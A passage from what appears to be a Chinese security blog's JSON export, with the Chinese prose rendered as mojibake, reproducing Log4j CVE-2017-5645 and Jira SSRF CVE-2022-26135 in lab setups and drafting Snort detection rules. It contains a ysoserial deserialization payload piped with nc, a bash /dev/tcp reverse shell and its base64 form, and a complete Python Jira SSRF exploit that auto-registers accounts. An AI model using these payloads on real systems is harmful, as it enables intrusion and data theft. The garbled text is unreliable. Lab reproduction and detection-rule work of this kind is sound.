ç»†è‡´åœ°æ§åˆ¶æ—¥å¿—çš„ç”Ÿæˆè¿‡ç¨‹ã€‚æœ€ä»¤äººæ„Ÿå…´è¶£çš„å°±æ˜¯ï¼Œè¿™äº›å¯ä»¥é€šè¿‡ä¸€ä¸ªé…ç½®æ–‡ä»¶æ¥çµæ´»åœ°è¿›è¡Œé…ç½®ï¼Œè€Œä¸éœ€è¦ä¿®æ”¹åº”ç”¨çš„ä»£ç ã€‚ Log4jåœ¨å·¥ç¨‹ä¸­å¯ä»¥æ˜“ç”¨ï¼Œæ–¹ä¾¿ç­‰ä»£æ›¿äº† System.out ç­‰æ‰“å°è¯­å¥ï¼Œå®ƒæ˜¯ Javaä¸‹æœ€æµè¡Œçš„æ—¥å¿—è¾“å…¥å·¥å…·ï¼Œä¸€äº›è‘—åçš„å¼€æºé¡¹ç›®ï¼Œåƒspringã€hibernateã€strutséƒ½ä½¿ç”¨è¯¥ å·¥å…·ä½œä¸ºæ—¥å¿—è¾“å…¥å·¥å…·ï¼Œå¯ä»¥å¸®åŠ©è°ƒè¯•ï¼ˆæœ‰æ—¶å€™debugæ˜¯å‘æŒ¥ä¸äº†ä½œç”¨çš„ï¼‰å’Œåˆ†æã€‚ å½±å“ç‰ˆæœ¬Log4j 2.x&lt;&#x3D;2.8.1 æ¼æ´åŸç† å½“æˆ‘ä»¬è¿è¡Œä»£ç åï¼Œç¨‹åºä¼šåœ¨æœ¬åœ°çš„ 8888 ç«¯å£å¼€å§‹ç­‰å¾…æ¥æ”¶æ•°æ®ï¼Œç„¶ååœ¨ä¸‹å›¾ç¬¬105è¡Œä»£ç å¤„ï¼Œå°†æ¥æ”¶åˆ°çš„æ•°æ®è½¬æ¢æˆ ObjectInputStream å¯¹è±¡æ•°æ®ï¼Œæœ€ç»ˆåœ¨ handler.start() ä¸­è°ƒç”¨ SocketHandler ç±»çš„ run æ–¹æ³•ã€‚ åœ¨ SocketHandler ç±»çš„ run æ–¹æ³•ä¸­ï¼Œ ObjectInputStream å¯¹è±¡æ•°æ®è¢«ä¼ å…¥äº† ObjectInputStreamLogEventBridge ç±»çš„ logEvents æ–¹æ³•ï¼Œè€Œååºåˆ—åŒ–å°±å‘ç”Ÿåœ¨è¿™ä¸ªæ–¹æ³•ä¸­ã€‚ æ¼æ´å¤ç°é¶åœº 12cd Tools/vulhub/log4j/CVE-2017-5645docker-compose up -d æ”»å‡»æœº è½¯ä»¶åœ°å€ï¼šhttps://github.com/frohoff/ysoserial 1java -jar ysoserial-all.jar CommonsCollections5 &quot;touch /tmp/testsuccess&quot; | nc ip 4712 é¶æœºæ£€æŸ¥æ˜¯å¦æ‰§è¡ŒæˆåŠŸ åå¼¹shell1bash -i &gt;&amp; /dev/tcp/ip/7777 0&gt;&amp;1 baseç¼–ç  https://base64.us/ 1YmFzaCAtaSA+JiAvZGV2L3RjcC9pcC83Nzc3IDA+JjE= æ”»å‡»æœºå»ºç«‹ç›‘å¬ 1nc -lnvp 7777 æ”»å‡»æœºå¦å»ºç»ˆç«¯ï¼Œæ‰§è¡Œ 1java -jar ysoserial-all.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9pcC83Nzc3IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; | nc ip 4712 ç‰¹å¾æµé‡Content åŒ…æ‹¬ï¼šğŸ‘‡ 12ysoserialCommonsCollections5 ç«¯å£ï¼Œæ³¨æ„æ˜¯4712ï¼Œè§„åˆ™ç¼–å†™ç«¯å£éƒ¨åˆ†è¦å†™anyã€‚å¦å¤–ä¸èƒ½ç”¨http_methodçš„å‚æ•°ï¼Œå› ä¸ºå®ƒè§„å®šäº†ç«¯å£èŒƒå›´ï¼Œè¦åœ¨æŒ‡å®šçš„ç«¯å£èŒƒå›´å†…æ‰èƒ½ä½¿ç”¨è¯¥å‚æ•° å‚è€ƒé“¾æ¥https://www.hacking8.com/bug-product/Apache-Log4j/CVE-2017-5645-Log4j-2.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html https://xz.aliyun.com/t/1909","categories":[{"name":"æ¼æ´å¤ç°","slug":"æ¼æ´å¤ç°","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[],"author":"Gryffinbit"},{"title":"Jira-SSRFæ¼æ´å¤ç°åŠæµé‡åˆ†æï¼ˆsnortè§„åˆ™ï¼‰ï¼ˆCVE-2022-26135ï¼‰","slug":"Jira-SSRFæ¼æ´å¤ç°åŠæµé‡åˆ†æï¼ˆsnortè§„åˆ™ï¼‰ï¼ˆCVE-2022-26135ï¼‰","date":"2022-11-23T10:06:06.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2022/11/23/Jira-SSRFæ¼æ´å¤ç°åŠæµé‡åˆ†æï¼ˆsnortè§„åˆ™ï¼‰ï¼ˆCVE-2022-26135ï¼‰/","permalink":"https://gryffinbit.top/2022/11/23/Jira-SSRF%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%EF%BC%88snort%E8%A7%84%E5%88%99%EF%BC%89%EF%BC%88CVE-2022-26135%EF%BC%89/","excerpt":"","text":"æ¼æ´æè¿°JIRA[4] æ˜¯ä¸€ä¸ªç¼ºé™·è·Ÿè¸ªç®¡ç†ç³»ç»Ÿï¼Œä¸ºé’ˆå¯¹ç¼ºé™·ç®¡ç†ã€ä»»åŠ¡è¿½è¸ªå’Œé¡¹ç›®ç®¡ç†çš„å•†ä¸šæ€§åº”ç”¨è½¯ä»¶ï¼Œ.åŸºäºJavaæ¶æ„çš„ç®¡ç†ç³»ç»Ÿï¼Œå¼€å‘è€…æ˜¯Atlassianï¼Œæ˜¯é›†é¡¹ç›®è®¡åˆ’ã€ä»»åŠ¡åˆ†é…ã€éœ€æ±‚ç®¡ç†ã€é”™è¯¯è·Ÿè¸ªäºä¸€ä½“çš„å•†ä¸šè½¯ä»¶ã€‚2022å¹´ 6æœˆ29æ—¥ï¼ŒAtlassianå®˜æ–¹å‘å¸ƒå®‰å…¨å…¬å‘Šï¼Œåœ¨Atlassian Jira å¤šæ¬¾äº§å“ä¸­å­˜åœ¨æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ æ¼æ´(SSRF)ï¼Œç»è¿‡èº«ä»½éªŒè¯çš„è¿œç¨‹æ”»å‡»è€…å¯é€šè¿‡å‘Jira Core REST APIå‘é€ç‰¹åˆ¶è¯·æ±‚ï¼Œä»è€Œä¼ªé€ æœåŠ¡ç«¯å‘èµ·è¯·æ±‚ï¼Œä»è€Œå¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼ŒåŒæ—¶ä¸ºä¸‹ä¸€æ­¥æ”»å‡»åˆ©ç”¨æä¾›æ¡ä»¶ã€‚éœ€æ³¨æ„çš„æ˜¯ï¼Œè‹¥æœåŠ¡ç«¯å¼€å¯æ³¨å†ŒåŠŸèƒ½ï¼Œåˆ™æœªæˆæƒç”¨æˆ·å¯é€šè¿‡æ³¨å†Œè·å–æƒé™è¿›è€Œåˆ©ç”¨ã€‚ åˆ©ç”¨èŒƒå›´ Jira Core Server, Jira Software Server, and Jira Software Data Center: Versions after 8.0 and before 8.13.22 8.14.x 8.15.x 8.16.x 8.17.x 8.18.x 8.19.x 8.20.x before 8.20.10 8.21.x 8.22.x before 8.22.4 Jira Service Management Server and Data Center: Versions after 4.0 and before 4.13.22 4.14.x 4.15.x 4.16.x 4.17.x 4.18.x 4.19.x 4.20.x before 4.20.10 4.21.x 4.22.x before 4.22.4 ç¯å¢ƒæ­å»ºhttps://hub.docker.com/r/weareogury/atlassian-jira-software/tags 12docker pull weareogury/atlassian-jira-software:8.20.8docker run -d -p 7080:8080 weareogury/atlassian-jira-software:8.20.8 æŒ‰ç…§æ­¥éª¤é…ç½® é…ç½®æˆåŠŸ æ¼æ´å¤ç°ä½äºcom.atlassian.jira.plugin.mobile.util.LinkBuilder.classï¼ŒURLé€šè¿‡ç®€å•çš„æ‹¼æ¥æ„é€ ï¼Œè€Œå…¶ä¸­çš„pathæ¥è‡ªäºlocationï¼Œå®Œå…¨å¯æ§ã€‚locationä¼šä»jsonå¯¹è±¡ä¸­è·å–ï¼Œåœ¨è·å–åˆ°URLå¯¹è±¡åï¼Œå†è°ƒç”¨httpClientProviderå‘é€Httpè¯·æ±‚ã€‚ å› ä¸ºURLçš„ååŠéƒ¨åˆ†æ˜¯å¯æ§çš„ï¼Œå¦‚æœæˆ‘ä»¬ç®€å•æŒ‡å®šlocationä¸º@xx.comï¼Œé‚£ä¹ˆæœ€ç»ˆçš„URLä¸ºhttps:&#x2F;&#x2F;jira-host.com@xx.comï¼ŒhttpClientProviderå®é™…ä¸Šä¼šå¯¹xx.comå‘é€httpè¯·æ±‚ï¼Œæ‰€ä»¥å¯¼è‡´äº†SSRFæ¼æ´äº§ç”Ÿã€‚ åˆ©ç”¨é“¾ burpè¿›è¡Œæ”¹åŒ… 1234567891011121314POST /rest/nativemobile/1.0/batch HTTP/2Host: issues.example.comCookie: JSESSIONID=44C6A24A15A1128CE78586A0FA1B1662; seraph.rememberme.cookie=818752%3Acc12c66e2f048b9d50eff8548800262587b3e9b1; atlassian.xsrf.token=AES2-GIY1-7JLS-HNZJ_db57d0893ec4d2e2f81c51c1a8984bde993b7445_linUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36Content-Type: application/jsonAccept: application/json, text/javascript, */*; q=0.01X-Requested-With: XMLHttpRequestOrigin: https://issues.example.comReferer: https://issues.example.com/plugins/servlet/deskAccept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9Content-Length: 63&#123;&quot;requests&quot;:[&#123;&quot;method&quot;:&quot;GET&quot;,&quot;location&quot;:&quot;@example.com&quot;&#125;]&#125; expè„šæœ¬ é¡¹ç›®åœ°å€ï¼šhttps://github.com/assetnote/jira-mobile-ssrf-exploit ä½¿ç”¨æ–¹å¼ï¼š 123# requirements.txtrequestsbeautifulsoup4 1pip3 install -r requirements.txt and then you can use the exploit using: 1python3 exploit.py Help: 1234567891011usage: exploit.py [-h] --target TARGET --ssrf SSRF --mode MODE [--software SOFTWARE] [--username USERNAME] [--email EMAIL] [--password PASSWORD]optional arguments: -h, --help show this help message and exit --target TARGET i.e. http://re.local:8090 --ssrf SSRF i.e. example.com (no protocol pls) --mode MODE i.e. manual or automatic - manual mode you need to provide user auth info --software SOFTWARE i.e. jira or jsd - only needed for manual mode --username USERNAME i.e. admin - only needed for manual jira mode --email EMAIL i.e. admin@example.com - only needed for manual jira service desk mode --password PASSWORD i.e. testing123 - only needed for manual mode If you already have credentials for Jira &#x2F; Jira Service Desk, then set the --mode to manual and the --software argument to either jira or jsd. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191import requestsimport stringimport randomimport argparsefrom bs4 import BeautifulSoup as bs4import urllib3urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)parser = argparse.ArgumentParser()parser.add_argument(&quot;--target&quot;, help=&quot;i.e. http://re.local:8090&quot;, required=True)parser.add_argument(&quot;--ssrf&quot;, help=&quot;i.e. example.com (no protocol pls)&quot;, required=True)parser.add_argument(&quot;--mode&quot;, help=&quot;i.e. manual or automatic - manual mode you need to provide user auth info&quot;, required=True, default=&quot;automatic&quot;)parser.add_argument(&quot;--software&quot;, help=&quot;i.e. jira or jsd - only needed for manual mode&quot;)parser.add_argument(&quot;--username&quot;, help=&quot;i.e. admin - only needed for manual jira mode&quot;)parser.add_argument(&quot;--email&quot;, help=&quot;i.e. admin@example.com - only needed for manual jira service desk mode&quot;)parser.add_argument(&quot;--password&quot;, help=&quot;i.e. testing123 - only needed for manual mode&quot;)args = parser.parse_args()if args.mode == &quot;manual&quot;: if args.software == &quot;&quot;: print(&quot;[*] please pass in a software (jira / jsd)&quot;) if args.software == &quot;jira&quot; and args.email == &quot;&quot; and args.password == &quot;&quot;: print(&quot;[*] must provide an email and password for jira in manual mode&quot;) if args.software == &quot;jsd&quot; and args.username == &quot;&quot; and args.password == &quot;&quot;: print(&quot;[*] must provide an username and password for jira in manual mode&quot;)# atlast - exploit tested on jira &lt; 8.20.3 / jira service desk &lt; 4.20.3-REL-0018# for full list of affected jira versions please see the following URL# https://confluence.atlassian.com/jira/jira-server-security-advisory-29nd-june-2022-1142430667.html# by shubsbanner = &quot;&quot;&quot; _ _ _ __ _| |_| | __ _ ___| |_ / _` | __| |/ _` / __| __| | (_| | |_| | (_| \\__ \\ |_ \\__,_|\\__|_|\\__,_|___/\\__|jira full read ssrf [CVE-2022-26135]brought to you by assetnote [https://assetnote.io] &quot;&quot;&quot;print(banner)proxies = &#123;&#125; # proxy to burp like this - &#123;&quot;https&quot;:&quot;http://localhost:8080&quot;&#125;session = requests.Session()def detect_jira_root(target): root_paths = [&quot;/&quot;, &quot;/secure/&quot; &quot;/jira/&quot;, &quot;/issues/&quot;] jira_found = &quot;&quot; for path in root_paths: test_url = &quot;&#123;&#125;/&#123;&#125;&quot;.format(target, path) r = session.get(test_url, verify=False, proxies=proxies) if &quot;ajs-base-url&quot; in r.text: jira_found = path break return jira_founddef get_jira_signup(target, base_path): test_url = &quot;&#123;&#125;&#123;&#125;&quot;.format(target, base_path) r = session.get(test_url, verify=False, proxies=proxies) signup_enabled = False if &quot;Signup!default.jspa&quot; in r.text: signup_enabled = True return signup_enableddef signup_user(target, base_path): test_url = &quot;&#123;&#125;&#123;&#125;secure/Signup!default.jspa&quot;.format(target, base_path) test_url_post = &quot;&#123;&#125;&#123;&#125;secure/Signup.jspa&quot;.format(target, base_path) r = session.get(test_url, verify=False, proxies=proxies) if &#x27;name=&quot;captcha&quot;&#x27; in r.text: print(&quot;[*] url &#123;&#125; has captchas enabled, please complete flow manually and provide user and password as arg&quot;.format(test_url)) return False, &#123;&#125; if &quot;Mode Breach&quot; in r.text: print(&quot;[*] url &#123;&#125; has signups disabled, trying JSD approach&quot;.format(test_url)) return False, &#123;&#125; # captcha not detected, proceed with registration html_bytes = r.text soup = bs4(html_bytes, &#x27;lxml&#x27;) token = soup.find(&#x27;input&#x27;, &#123;&#x27;name&#x27;:&#x27;atl_token&#x27;&#125;)[&#x27;value&#x27;] full_name = &#x27;&#x27;.join(random.sample((string.ascii_uppercase+string.digits),6)) email = &quot;&#123;&#125;@example.com&quot;.format(full_name) password = &quot;9QWP7zyvfa4nJU9QKu*Yt8_QzbP&quot; paramsPost = &#123;&quot;password&quot;:password,&quot;Signup&quot;:&quot;Sign up&quot;,&quot;atl_token&quot;:token,&quot;fullname&quot;:full_name,&quot;email&quot;:email,&quot;username&quot;:full_name&#125; headers = &#123;&quot;Accept&quot;:&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;,&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36&quot;,&quot;Connection&quot;:&quot;close&quot;,&quot;Pragma&quot;:&quot;no-cache&quot;,&quot;DNT&quot;:&quot;1&quot;,&quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;,&quot;Cache-Control&quot;:&quot;no-cache&quot;,&quot;Upgrade-Insecure-Requests&quot;:&quot;1&quot;,&quot;Accept-Language&quot;:&quot;en-US,en;q=0.9&quot;,&quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;&#125; cookies = &#123;&quot;atlassian.xsrf.token&quot;:token&#125; r = session.post(test_url_post, data=paramsPost, headers=headers, cookies=cookies, verify=False, proxies=proxies) if &quot;Congratulations!&quot; in r.text: print(&quot;[*] successful registration&quot;) user_obj = &#123;&quot;username&quot;: full_name, &quot;password&quot;: password, &quot;email&quot;: email&#125; return True, user_obj# attempts to signup to root JSDdef register_jsd(target, base_path): register_url = &quot;&#123;&#125;&#123;&#125;servicedesk/customer/user/signup&quot;.format(target, base_path) full_name = &#x27;&#x27;.join(random.sample((string.ascii_uppercase+string.digits),6)) email = &quot;&#123;&#125;@example.com&quot;.format(full_name) password = &quot;9QWP7zyvfa4nJU9QKu*Yt8_QzbP&quot; # try and sign up to the service desk portal without project IDs (easy win?) rawBody = &quot;&#123;&#123;\\&quot;email\\&quot;:\\&quot;&#123;&#125;\\&quot;,\\&quot;fullname\\&quot;:\\&quot;&#123;&#125;\\&quot;,\\&quot;password\\&quot;:\\&quot;&#123;&#125;\\&quot;,\\&quot;captcha\\&quot;:\\&quot;\\&quot;,\\&quot;secondaryEmail\\&quot;:\\&quot;\\&quot;&#125;&#125;&quot;.format(email, full_name, password) headers = &#123;&quot;Origin&quot;:&quot;&#123;&#125;&quot;.format(target),&quot;Accept&quot;:&quot;*/*&quot;,&quot;X-Requested-With&quot;:&quot;XMLHttpRequest&quot;,&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36&quot;,&quot;Referer&quot;:&quot;&#123;&#125;/servicedesk/customer/portal/1/user/signup&quot;.format(target),&quot;Connection&quot;:&quot;close&quot;,&quot;Pragma&quot;:&quot;no-cache&quot;,&quot;DNT&quot;:&quot;1&quot;,&quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;,&quot;Cache-Control&quot;:&quot;no-cache&quot;,&quot;Accept-Language&quot;:&quot;en-US,en;q=0.9&quot;,&quot;Content-Type&quot;:&quot;application/json&quot;&#125; r = session.post(register_url, data=rawBody, headers=headers, verify=False, proxies=proxies) if r.status_code == 204: print(&quot;[*] successful registration&quot;) user_obj = &#123;&quot;username&quot;: full_name, &quot;password&quot;: password, &quot;email&quot;: email&#125; return True, user_obj print(&quot;[*] url &#123;&#125; has non-captcha user/pass signups disabled :(&quot;.format(register_url)) register_email_url = &quot;&#123;&#125;&#123;&#125;servicedesk/customer/user/emailsignup&quot;.format(target, base_path) rawBody = &quot;&#123;&#123;\\&quot;email\\&quot;:\\&quot;&#123;&#125;\\&quot;,\\&quot;captcha\\&quot;:\\&quot;\\&quot;,\\&quot;secondaryEmail\\&quot;:\\&quot;\\&quot;&#125;&#125;&quot;.format(email) r = session.post(register_email_url, data=rawBody, headers=headers, verify=False, proxies=proxies) if r.status_code == 204: print(&quot;[*] registration may be possible via emailsignup endpoint&quot;) print(&quot;[*] you will have to manually exploit this with a real email&quot;) print(&quot;[*] visit &#123;&#125;&quot;.format(register_url)) return False, &#123;&#125; if r.status_code == 400: print(&quot;[*] registration may be possible via emailsignup endpoint&quot;) print(&quot;[*] you will have to manually exploit this with a real email and captcha&quot;) print(&quot;[*] visit &#123;&#125;&quot;.format(register_url)) return False, &#123;&#125; print(r.status_code) return False, &#123;&#125;def exploit_ssrf_jsd(target, base_path, user_obj, ssrf_host): login_url = &quot;&#123;&#125;&#123;&#125;servicedesk/customer/user/login&quot;.format(target, base_path) paramsPost = &#123;&quot;os_password&quot;:user_obj[&quot;password&quot;],&quot;os_username&quot;:user_obj[&quot;email&quot;]&#125; headers = &#123;&quot;Origin&quot;:&quot;&#123;&#125;&quot;.format(target),&quot;Accept&quot;:&quot;*/*&quot;,&quot;X-Requested-With&quot;:&quot;XMLHttpRequest&quot;,&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36&quot;,&quot;Referer&quot;:&quot;&#123;&#125;/servicedesk/customer/portal/1/user/signup&quot;.format(target),&quot;Connection&quot;:&quot;close&quot;,&quot;Pragma&quot;:&quot;no-cache&quot;,&quot;DNT&quot;:&quot;1&quot;,&quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;,&quot;Cache-Control&quot;:&quot;no-cache&quot;,&quot;Accept-Language&quot;:&quot;en-US,en;q=0.9&quot;,&quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;&#125; r = session.post(login_url, data=paramsPost, headers=headers, verify=False, proxies=proxies) if &quot;loginSucceeded&quot; in r.text: print(&quot;[*] successful login&quot;) test_url = &quot;&#123;&#125;&#123;&#125;rest/nativemobile/1.0/batch&quot;.format(target, base_path) rawBody = &quot;&#123;&#123;\\&quot;requests\\&quot;:[&#123;&#123;\\&quot;method\\&quot;:\\&quot;GET\\&quot;,\\&quot;location\\&quot;:\\&quot;@&#123;&#125;\\&quot;&#125;&#125;]&#125;&#125;&quot;.format(ssrf_host) headers = &#123;&quot;Origin&quot;:&quot;&#123;&#125;&quot;.format(target),&quot;Accept&quot;:&quot;*/*&quot;,&quot;X-Requested-With&quot;:&quot;XMLHttpRequest&quot;,&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36&quot;,&quot;Referer&quot;:&quot;&#123;&#125;/servicedesk/customer/portal/1/user/signup&quot;.format(target),&quot;Connection&quot;:&quot;close&quot;,&quot;Pragma&quot;:&quot;no-cache&quot;,&quot;DNT&quot;:&quot;1&quot;,&quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;,&quot;Cache-Control&quot;:&quot;no-cache&quot;,&quot;Accept-Language&quot;:&quot;en-US,en;q=0.9&quot;,&quot;Content-Type&quot;:&quot;application/json&quot;&#125; r = session.post(test_url, data=rawBody, headers=headers) print(&quot;Status code: %i&quot; % r.status_code) print(&quot;Response body: %s&quot; % r.content)def exploit_ssrf_jira(target, base_path, user_obj, ssrf_host): login_url = &quot;&#123;&#125;&#123;&#125;login.jsp&quot;.format(target, base_path) paramsPost = &#123;&quot;os_password&quot;:user_obj[&quot;password&quot;],&quot;user_role&quot;:&quot;&quot;,&quot;os_username&quot;:user_obj[&quot;username&quot;],&quot;atl_token&quot;:&quot;&quot;,&quot;os_destination&quot;:&quot;&quot;,&quot;login&quot;:&quot;Log In&quot;&#125; headers = &#123;&quot;Origin&quot;:&quot;&#123;&#125;&quot;.format(target),&quot;Accept&quot;:&quot;*/*&quot;,&quot;X-Requested-With&quot;:&quot;XMLHttpRequest&quot;,&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36&quot;,&quot;Referer&quot;:&quot;&#123;&#125;/&quot;.format(target),&quot;Connection&quot;:&quot;close&quot;,&quot;Pragma&quot;:&quot;no-cache&quot;,&quot;DNT&quot;:&quot;1&quot;,&quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;,&quot;Cache-Control&quot;:&quot;no-cache&quot;,&quot;Upgrade-Insecure-Requests&quot;:&quot;1&quot;,&quot;Accept-Language&quot;:&quot;en-US,en;q=0.9&quot;,&quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;&#125; r = session.post(login_url, data=paramsPost, headers=headers, verify=False, proxies=proxies) if r.headers[&quot;X-Seraph-LoginReason&quot;] == &quot;OK&quot;: print(&quot;[*] successful login&quot;) test_url = &quot;&#123;&#125;&#123;&#125;rest/nativemobile/1.0/batch&quot;.format(target, base_path) rawBody = &quot;&#123;&#123;\\&quot;requests\\&quot;:[&#123;&#123;\\&quot;method\\&quot;:\\&quot;GET\\&quot;,\\&quot;location\\&quot;:\\&quot;@&#123;&#125;\\&quot;&#125;&#125;]&#125;&#125;&quot;.format(ssrf_host) headers = &#123;&quot;Origin&quot;:&quot;&#123;&#125;&quot;.format(target),&quot;Accept&quot;:&quot;*/*&quot;,&quot;X-Requested-With&quot;:&quot;XMLHttpRequest&quot;,&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36&quot;,&quot;Referer&quot;:&quot;&#123;&#125;/servicedesk/customer/portal/1/user/signup&quot;.format(target),&quot;Connection&quot;:&quot;close&quot;,&quot;Pragma&quot;:&quot;no-cache&quot;,&quot;DNT&quot;:&quot;1&quot;,&quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;,&quot;Cache-Control&quot;:&quot;no-cache&quot;,&quot;Accept-Language&quot;:&quot;en-US,en;q=0.9&quot;,&quot;Content-Type&quot;:&quot;application/json&quot;&#125; r = session.post(test_url, data=rawBody, headers=headers) print(&quot;Status code: %i&quot; % r.status_code) print(&quot;Response body: %s&quot; % r.content)# target = &quot;http://re.local:8090&quot;# ssrf_host = &quot;907zer1sxey5czbnnf7p9d1zfqlj98.oastify.com&quot;user_obj = &#123;&#125;successful_jira_signup = Falsesuccessful_jsd_signup = Falsejira_root = detect_jira_root(args.target)if args.mode == &quot;manual&quot; and args.software == &quot;jira&quot;: user_obj = &#123;&quot;username&quot;: args.username, &quot;password&quot;: args.password, &quot;email&quot;: args.email&#125; exploit_ssrf_jira(args.target, jira_root, user_obj, args.ssrf)if args.mode == &quot;manual&quot; and args.software == &quot;jsd&quot;: user_obj = &#123;&quot;username&quot;: args.username, &quot;password&quot;: args.password, &quot;email&quot;: args.email&#125; exploit_ssrf_jsd(args.target, jira_root, user_obj, args.ssrf)if args.mode == &quot;automatic&quot;: signup_enabled = get_jira_signup(args.target, jira_root) successful_jira_signup, user_obj = signup_user(args.target, jira_root) if successful_jira_signup == True: exploit_ssrf_jira(args.target, jira_root, user_obj, args.ssrf) if successful_jira_signup == False: # try to sign up to jira service desk instead successful_jsd_signup, user_obj = register_jsd(args.target, jira_root) if successful_jsd_signup: exploit_ssrf_jsd(args.target, jira_root, user_obj, args.ssrf)if successful_jira_signup == False and successful_jsd_signup == False: print(&quot;[*] sorry boss no ssrf for you today&quot;) è§„åˆ™æå–æ³¨æ„ç«¯å£èŒƒå›´ï¼š é»˜è®¤çš„$HTTP_PORTS 1[36,80,81,82,83,84,85,86,87,88,89,90,311,383,555,591,593,631,801,808,818,901,972,1158,1220,1414,1533,1741,1830,1942,2231,2301,2381,2578,2809,2980,3029,3037,3057,3128,3443,3702,4000,4343,4848,5000,5117,5250,5600,6080,6173,6988,7000,7001,7071,7144,7145,7510,7770,7777,7778,7779,8000,8008,8014,8028,8080,8081,8082,8085,8088,8090,8118,8123,8180,8181,8222,8243,8280,8300,8333,8344,8500,8509,8800,8888,8899,8983,9000,9060,9080,9090,9091,9111,9290,9443,9999,10000,11371,12601,13014,15489,29991,33300,34412,34443,34444,41080,44449,50000,50002,51423,53331,55252,55555,56712] 1alert tcp $EXTERNAL_NET any -&gt; $HOME_NET any ç‰¹å¾æµé‡ 1/rest/nativemobile/1.0/batch 1/plugins/servlet/desk å¯ä»¥ä½œä¸ºæå–çš„ç‰¹å¾ snortéœ€è¦æ³¨æ„çš„ç»†èŠ‚ ä½¿ç”¨http_methodçš„æ—¶å€™ï¼Œè¦ç›¸åº”çš„è§„å®šhttpçš„ç«¯å£ï¼ˆhttpæœåŠ¡ï¼‰ï¼Œè¦é™å®šç«¯å£æˆ–è€…æ˜¯ä½¿ç”¨$HTTP_PORTS å˜é‡ã€‚ä¸ç„¶æ— æ³•è§¦å‘ã€‚ å‚è€ƒæ–‡ç« https://paper.seebug.org/1981/","categories":[{"name":"æ¼æ´å¤ç°","slug":"æ¼æ´å¤ç°","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"Jira","slug":"Jira","permalink":"https://gryffinbit.top/tags/Jira/"},{"name":"SSRF","slug":"SSRF","permalink":"https://gryffinbit.top/tags/SSRF/"}],"author":"Gryffinbit"},{"title":"Weblogic SSRFæ¼æ´å¤ç°åŠç‰¹å¾æµé‡åˆ†æï¼ˆsnortè§„åˆ™ï¼‰","slug":"Weblogic-SSRFæ¼æ´å¤ç°åŠç‰¹å¾æµé‡åˆ†æï¼ˆsnortè§„åˆ™ï¼‰","date":"2022-11-21T14:43:43.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2022/11/21/Weblogic-SSRFæ¼æ´å¤ç°åŠç‰¹å¾æµé‡åˆ†æï¼ˆsnortè§„åˆ™ï¼‰/","permalink":"https://gryffinbit.top/2022/11/21/Weblogic-SSRF%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E7%89%B9%E5%BE%81%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%EF%BC%88snort%E8%A7%84%E5%88%99%EF%BC%89/","excerpt":"","text":"æ¼æ´è¯¦æƒ…SSRF æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ (Server-Side Request Forgery),æ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚ SSRFå½¢æˆçš„åŸå› 